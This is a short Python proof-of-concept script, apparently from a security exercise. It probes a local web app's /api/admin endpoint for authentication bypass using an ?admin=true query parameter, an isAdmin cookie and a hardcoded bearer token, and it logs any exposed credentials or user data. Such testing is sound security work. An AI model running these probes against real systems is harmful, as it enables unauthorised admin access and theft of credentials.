#!/usr/bin/env python3
"""
Example exploit: Authentication Bypass via Query Parameter
Tests if admin access can be gained via ?admin=true parameter
"""

import requests
import json
import sys


def exploit():
    """Test authentication bypass on /api/admin endpoint."""
    target = "http://localhost:3000"
    results = {
        "vulnerability_id": "AUTH-BYPASS-001",
        "type": "Authentication Bypass",
        "status": "unknown",
        "evidence": [],
        "data_exposed": []
    }

    try:
        # Test 1: Query parameter bypass
        print("[*] Testing query parameter auth bypass...", file=sys.stderr)
        response = requests.get(f"{target}/api/admin?admin=true", timeout=10)

        if response.status_code == 200:
            results["status"] = "vulnerable"
            results["evidence"].append("Admin access granted via ?admin=true parameter")
            results["method"] = "query_parameter"

            try:
                data = response.json()
                if "systemInfo" in data:
                    results["data_exposed"].append("System information")
                if "database" in data:
                    results["data_exposed"].append("Database credentials")
                if "users" in data:
                    results["data_exposed"].append("User list with passwords")
                    results["sensitive_data"] = data.get("users", [])
            except:
                pass

        # Test 2: Cookie bypass
        print("[*] Testing cookie-based auth bypass...", file=sys.stderr)
        response2 = requests.get(
            f"{target}/api/admin",
            cookies={"isAdmin": "true"},
            timeout=10
        )

        if response2.status_code == 200 and results["status"] != "vulnerable":
            results["status"] = "vulnerable"
            results["evidence"].append("Admin access granted via isAdmin=true cookie")
            results["method"] = "cookie"

        # Test 3: Bearer token bypass
        print("[*] Testing bearer token bypass...", file=sys.stderr)
        response3 = requests.get(
            f"{target}/api/admin",
            headers={"Authorization": "Bearer admin_super_secret_token"},
            timeout=10
        )

        if response3.status_code == 200 and results["status"] != "vulnerable":
            results["status"] = "vulnerable"
            results["evidence"].append("Admin access granted via hardcoded bearer token")
            results["method"] = "bearer_token"

        if results["status"] == "unknown":
            results["status"] = "not_vulnerable"

    except requests.exceptions.RequestException as e:
        results["status"] = "error"
        results["error"] = str(e)
    except Exception as e:
        results["status"] = "error"
        results["error"] = str(e)

    return results


if __name__ == "__main__":
    result = exploit()
    print(json.dumps(result, indent=2))
